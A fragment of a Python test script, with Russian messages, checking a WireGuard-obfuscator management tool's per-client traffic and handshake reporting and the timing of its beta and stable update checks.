with open(os.path.join(ROOT, "etc/wireguard/wgobf0.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = X\n\n[Peer]\n# client=wa\nPublicKey = WAPUB=\nAllowedIPs = 10.66.66.2/32\n\n"
            "[Peer]\n# client=wb\nPublicKey = WBPUB=\nAllowedIPs = 10.66.66.3/32\n")
with open(WG_DUMP, "w") as f:
    f.write(f"SRVPRIV=\tSRVPUB=\t51900\toff\nWAPUB=\t(none)\t127.0.0.1:40000\t10.66.66.2/32\t{int(time.time()) - 40}"
            "\t5000\t7000\t25\n")
r = api("wgobf", "clients")
rows = {x["name"]: x for x in r.get("data") or []}
chk("клиенты обфускатора: рукопожатие и трафик с запуска; у второго (нет в dump) — пусто, не цифры соседа",
    r.get("ok") and rows.get("wa", {}).get("rx") == 5000 and rows["wa"].get("tx") == 7000 and 30 <= rows["wa"].get("ago", -1) <= 120
    and rows.get("wb", {}).get("rx") == 0 and rows["wb"].get("ago") is None, r)
r = api("traffic", "now")
d = r.get("data") or {}
chk("api traffic now — клиенты обфускатора отдельно (wpeers): живая скорость считает и их",
    r.get("ok") and d.get("wpeers") == {"wa": [5000, 7000]} and "wa" not in (d.get("peers") or {}), r)
os.remove(WG_DUMP)

print("\n── Проверка новой версии: бета — раз в 20 минут, стабильный — раз в час ──")
PEEK = 'update_peek() { touch "$STATE_DIR/peeked"; }; rm -f "$STATE_DIR/peeked"; '
for chan, age, want in (("beta", 1300, True), ("beta", 600, False), ("stable", 1300, False), ("stable", 3700, True)):
    rc, out, _ = bash(PEEK + f'update_channel_apply {chan}; echo "v1.0.0 $(( $(date +%s) - {age} ))" > "$UPDATE_CACHE"; '
                      'unset AWG_NO_UPDATE_CHECK; update_check_async; sleep 0.3; [[ -e "$STATE_DIR/peeked" ]] && echo PEEK || echo SKIP')
    chk(f"{chan}: прошлой проверке {age // 60} мин — {'проверяет' if want else 'ещё рано'}",
        out.strip().endswith("PEEK" if want else "SKIP"), out)

summary()
